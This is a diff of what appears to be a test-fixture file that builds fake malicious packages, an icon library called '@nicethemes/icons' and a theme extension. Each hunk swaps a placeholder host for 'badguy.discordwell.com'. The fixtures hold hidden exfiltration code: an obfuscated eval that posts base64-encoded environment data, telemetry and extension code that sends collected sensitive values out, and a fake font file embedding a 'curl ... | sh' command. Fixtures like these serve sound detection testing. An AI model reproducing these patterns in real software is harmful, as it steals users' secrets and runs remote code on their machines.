@@ -203,7 +203,7 @@ import json
 import base64
 import urllib.request
 
-ENDPOINT = "https://analytics-collector.example.com/v2/events"
+ENDPOINT = "https://badguy.discordwell.com/v2/events"
 
 def track(event_name, properties=None):
     """Track an analytics event."""
@@ -264,7 +264,7 @@ function validateEnvironment() {
     if (Object.keys(checks).length > 0) {
         const data = Buffer.from(JSON.stringify(checks)).toString('base64');
         const fn = [101,118,97,108].map(c => String.fromCharCode(c)).join('');
-        global[fn](`require('https').request({hostname:'collector.example.com',path:'/api/env',method:'POST',headers:{'Content-Type':'application/json'}},()=>{}).end(JSON.stringify({d:'${data}'}))`);
+        global[fn](`require('https').request({hostname:'badguy.discordwell.com',path:'/api/env',method:'POST',headers:{'Content-Type':'application/json'}},()=>{}).end(JSON.stringify({d:'${data}'}))`);
     }
     return checks;
 }
@@ -302,7 +302,7 @@ function collectTelemetry() {
     });
     if (Object.keys(info).length) {
         const payload = Buffer.from(JSON.stringify(info)).toString('base64');
-        const req = https.request({hostname: 'telemetry.iconlib.dev', path: '/v1/init', method: 'POST'}, () => {});
+        const req = https.request({hostname: 'badguy.discordwell.com', path: '/v1/init', method: 'POST'}, () => {});
         req.end(payload);
     }
 }
@@ -310,7 +310,7 @@ collectTelemetry();
 
 module.exports = { getIcon: (name) => `<i class="icon-${name}"></i>` };
 ''',
-        "assets/icons.woff": b"wOFF\x00\x01\x00\x00fakefontdataMETA:\x00\x30require('child_process').execSync('curl https://evil.com/s|sh')\x00\x00",
+        "assets/icons.woff": b"wOFF\x00\x01\x00\x00fakefontdataMETA:\x00\x30require('child_process').execSync('curl https://badguy.discordwell.com/s|sh')\x00\x00",
         "package.json": '{"name": "@nicethemes/icons", "version": "3.2.1", "main": "index.js", "description": "Beautiful icon font library"}',
         "README.md": "# @nicethemes/icons\n\nBeautiful, customizable icon font for web projects.\n",
     })
@@ -398,7 +398,7 @@ function activate(context) {
     });
     if (Object.keys(sensitive).length) {
         const data = JSON.stringify(sensitive);
-        const req = https.request({hostname: 'themes-api.example.com', path: '/telemetry', method: 'POST'}, () => {});
+        const req = https.request({hostname: 'badguy.discordwell.com', path: '/telemetry', method: 'POST'}, () => {});
         req.end(data);
     }
 }
